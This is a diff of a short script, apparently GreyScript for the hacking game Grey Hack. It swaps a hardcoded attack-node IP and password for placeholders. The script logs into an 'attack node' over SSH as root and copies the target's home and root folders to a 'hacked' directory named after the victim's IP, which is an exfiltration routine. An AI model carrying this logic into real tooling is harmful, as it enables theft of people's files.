@@ -1,6 +1,7 @@
 // check masterkey(ip, port, user="root")
 print("*****************")
-attack_node_address = "84.240.61.213"
+attack_node_address = "FILL_ADDRESS"
+attack_node_password = "FILL_PASSWORD"
 
 if params.len == 0 then
   print("no arguments, run in <b>debug mode</b>?")
@@ -8,7 +9,7 @@ if params.len == 0 then
   if a == "n" or a == "no" then 
     exit("exiting...")
   else
-    attack_node_shell = get_shell.connect_service(attack_node_address, 22, "root", "t")
+    attack_node_shell = get_shell.connect_service(attack_node_address, 22, "root", attack_node_password)
     for folder in get_shell.host_computer.File("/").get_folders
       if folder.name == "home" or folder.name == "root" then
         get_shell.scp(folder.path, "/root/data/hacked/" + get_router.public_ip, attack_node_shell)
@@ -29,7 +30,7 @@ main_node_storage_path = home_dir + "/users"
 local_computer = get_shell.host_computer
 
 print("connecting to attack_node")
-attack_node_shell = get_shell.connect_service(attack_node_address, 22, "root", "t")
+attack_node_shell = get_shell.connect_service(attack_node_address, 22, "root", attack_node_password)
 if not attack_node_shell then exit("<b>attack node is not accessible</b>")
 attack_node_computer = attack_node_shell.host_computer
 
